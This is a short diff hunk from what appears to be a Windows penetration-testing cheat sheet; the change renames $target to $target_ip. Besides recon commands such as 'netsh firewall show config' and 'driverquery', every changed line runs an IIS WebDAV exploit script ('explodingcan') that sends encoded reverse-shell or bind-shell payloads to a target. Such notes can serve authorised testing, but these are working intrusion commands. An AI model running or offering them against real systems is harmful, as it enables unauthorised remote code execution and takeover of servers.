@@ -160,10 +160,10 @@ netsh firewall show config
 
 driverquery
 
-python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target payloads_windows/shell_reverse_tcp_x86_shikata_ga_nai.bin
-python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target payloads_windows/shell_reverse_tcp_x64_shikata_ga_nai.bin
-python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target payloads_windows/shell_bind_tcp_x86_shikata_ga_nai.bin
-python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target payloads_windows/shell_bind_tcp_x64_shikata_ga_nai.bin
+python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target_ip payloads_windows/shell_reverse_tcp_x86_shikata_ga_nai.bin
+python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target_ip payloads_windows/shell_reverse_tcp_x64_shikata_ga_nai.bin
+python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target_ip payloads_windows/shell_bind_tcp_x86_shikata_ga_nai.bin
+python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target_ip payloads_windows/shell_bind_tcp_x64_shikata_ga_nai.bin
 
 
 # Check if CMD or Powershell
